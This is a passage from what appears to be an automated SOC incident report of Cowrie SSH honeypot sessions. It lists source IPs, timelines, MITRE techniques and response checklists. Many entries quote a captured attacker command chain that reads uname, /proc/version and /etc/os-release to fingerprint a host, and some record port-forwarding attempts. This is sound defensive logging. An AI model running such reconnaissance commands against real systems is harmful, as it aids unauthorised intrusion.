- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc545feab0be

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:50 |
| **Last Seen** | 2026-07-29 09:50 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:50:24` | `cowrie.session.connect` |
| `2026-07-29 09:50:25` | `cowrie.client.version` |
| `2026-07-29 09:50:25` | `cowrie.client.kex` |
| `2026-07-29 09:50:35` | `cowrie.login.success` |
| `2026-07-29 09:50:40` | `cowrie.session.params` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.success` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:40` | `cowrie.command.input` |
| `2026-07-29 09:50:43` | `cowrie.log.closed` |
| `2026-07-29 09:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef070e60038

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:52 |
| **Last Seen** | 2026-07-29 09:53 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:52:47` | `cowrie.session.connect` |
| `2026-07-29 09:52:50` | `cowrie.client.version` |
| `2026-07-29 09:52:50` | `cowrie.client.kex` |
| `2026-07-29 09:53:02` | `cowrie.login.success` |
| `2026-07-29 09:53:08` | `cowrie.session.params` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.success` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:08` | `cowrie.command.input` |
| `2026-07-29 09:53:11` | `cowrie.log.closed` |
| `2026-07-29 09:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f3e10c30b1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:55 |
| **Last Seen** | 2026-07-29 09:55 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:55:07` | `cowrie.session.connect` |
| `2026-07-29 09:55:10` | `cowrie.client.version` |
| `2026-07-29 09:55:10` | `cowrie.client.kex` |
| `2026-07-29 09:55:20` | `cowrie.login.success` |
| `2026-07-29 09:55:26` | `cowrie.session.params` |
| `2026-07-29 09:55:26` | `cowrie.command.input` |
| `2026-07-29 09:55:26` | `cowrie.command.input` |
| `2026-07-29 09:55:26` | `cowrie.command.input` |
| `2026-07-29 09:55:27` | `cowrie.command.input` |
| `2026-07-29 09:55:27` | `cowrie.command.input` |
| `2026-07-29 09:55:27` | `cowrie.command.success` |
| `2026-07-29 09:55:27` | `cowrie.command.input` |
| `2026-07-29 09:55:27` | `cowrie.command.input` |
| `2026-07-29 09:55:27` | `cowrie.command.input` |
| `2026-07-29 09:55:27` | `cowrie.command.input` |
| `2026-07-29 09:55:32` | `cowrie.log.closed` |
| `2026-07-29 09:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bae1fc3a7d1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 09:57 |
| **Last Seen** | 2026-07-29 09:58 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:57:43` | `cowrie.session.connect` |
| `2026-07-29 09:57:45` | `cowrie.client.version` |
| `2026-07-29 09:57:45` | `cowrie.client.kex` |
| `2026-07-29 09:57:55` | `cowrie.login.success` |
| `2026-07-29 09:57:58` | `cowrie.session.params` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.success` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:57:58` | `cowrie.command.input` |
| `2026-07-29 09:58:00` | `cowrie.log.closed` |
| `2026-07-29 09:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9e6426c1e8

| Field | Detail |
|---|---|
| **Source IP** | `121.188.193[.]78` |
| **First Seen** | 2026-07-29 09:58 |
| **Last Seen** | 2026-07-29 09:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:58:50` | `cowrie.session.connect` |
| `2026-07-29 09:58:51` | `cowrie.client.version` |
| `2026-07-29 09:58:51` | `cowrie.client.kex` |
| `2026-07-29 09:58:54` | `cowrie.login.success` |
| `2026-07-29 09:58:55` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.188.193[.]78` to AbuseIPDB if not already reported
- [ ] Block `121.188.193[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc64ac3ea84

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-07-29 09:59 |
| **Last Seen** | 2026-07-29 09:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 09:59:05` | `cowrie.session.connect` |
| `2026-07-29 09:59:06` | `cowrie.client.version` |
| `2026-07-29 09:59:06` | `cowrie.client.kex` |
| `2026-07-29 09:59:07` | `cowrie.login.success` |
| `2026-07-29 09:59:08` | `cowrie.direct-tcpip.request` |
| `2026-07-29 09:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b445461d06b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:00 |
| **Last Seen** | 2026-07-29 10:00 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:00:11` | `cowrie.session.connect` |
| `2026-07-29 10:00:13` | `cowrie.client.version` |
| `2026-07-29 10:00:13` | `cowrie.client.kex` |
| `2026-07-29 10:00:23` | `cowrie.login.success` |
| `2026-07-29 10:00:27` | `cowrie.session.params` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.success` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:27` | `cowrie.command.input` |
| `2026-07-29 10:00:29` | `cowrie.log.closed` |
| `2026-07-29 10:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad63bf8db030

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-29 10:01 |
| **Last Seen** | 2026-07-29 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:01:45` | `cowrie.session.connect` |
| `2026-07-29 10:01:45` | `cowrie.client.version` |
| `2026-07-29 10:01:45` | `cowrie.client.kex` |
| `2026-07-29 10:01:46` | `cowrie.login.success` |
| `2026-07-29 10:01:46` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:01:46` | `cowrie.direct-tcpip.ja4` |
| `2026-07-29 10:01:46` | `cowrie.direct-tcpip.data` |
| `2026-07-29 10:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c684a7fc34d2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:02 |
| **Last Seen** | 2026-07-29 10:02 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:02:29` | `cowrie.session.connect` |
| `2026-07-29 10:02:32` | `cowrie.client.version` |
| `2026-07-29 10:02:32` | `cowrie.client.kex` |
| `2026-07-29 10:02:39` | `cowrie.login.success` |
| `2026-07-29 10:02:41` | `cowrie.session.params` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.success` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:41` | `cowrie.command.input` |
| `2026-07-29 10:02:43` | `cowrie.log.closed` |
| `2026-07-29 10:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2b4e3d5b56

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:04 |
| **Last Seen** | 2026-07-29 10:05 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:04:56` | `cowrie.session.connect` |
| `2026-07-29 10:04:58` | `cowrie.client.version` |
| `2026-07-29 10:04:58` | `cowrie.client.kex` |
| `2026-07-29 10:05:11` | `cowrie.login.success` |
| `2026-07-29 10:05:16` | `cowrie.session.params` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.success` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:16` | `cowrie.command.input` |
| `2026-07-29 10:05:18` | `cowrie.log.closed` |
| `2026-07-29 10:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c342c8c79064

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:07 |
| **Last Seen** | 2026-07-29 10:07 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:07:11` | `cowrie.session.connect` |
| `2026-07-29 10:07:13` | `cowrie.client.version` |
| `2026-07-29 10:07:13` | `cowrie.client.kex` |
| `2026-07-29 10:07:25` | `cowrie.login.success` |
| `2026-07-29 10:07:31` | `cowrie.session.params` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.success` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:31` | `cowrie.command.input` |
| `2026-07-29 10:07:32` | `cowrie.command.input` |
| `2026-07-29 10:07:33` | `cowrie.log.closed` |
| `2026-07-29 10:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71df192e6abc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:09 |
| **Last Seen** | 2026-07-29 10:09 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:09:17` | `cowrie.session.connect` |
| `2026-07-29 10:09:20` | `cowrie.client.version` |
| `2026-07-29 10:09:30` | `cowrie.client.kex` |
| `2026-07-29 10:09:38` | `cowrie.login.success` |
| `2026-07-29 10:09:44` | `cowrie.session.params` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.success` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:44` | `cowrie.command.input` |
| `2026-07-29 10:09:45` | `cowrie.log.closed` |
| `2026-07-29 10:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8f56bd2cc43

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:11 |
| **Last Seen** | 2026-07-29 10:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:11:46` | `cowrie.session.connect` |
| `2026-07-29 10:11:47` | `cowrie.client.version` |
| `2026-07-29 10:11:47` | `cowrie.client.kex` |
| `2026-07-29 10:11:51` | `cowrie.login.success` |
| `2026-07-29 10:11:53` | `cowrie.session.params` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.success` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:53` | `cowrie.command.input` |
| `2026-07-29 10:11:54` | `cowrie.log.closed` |
| `2026-07-29 10:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7921b842a2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:13 |
| **Last Seen** | 2026-07-29 10:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

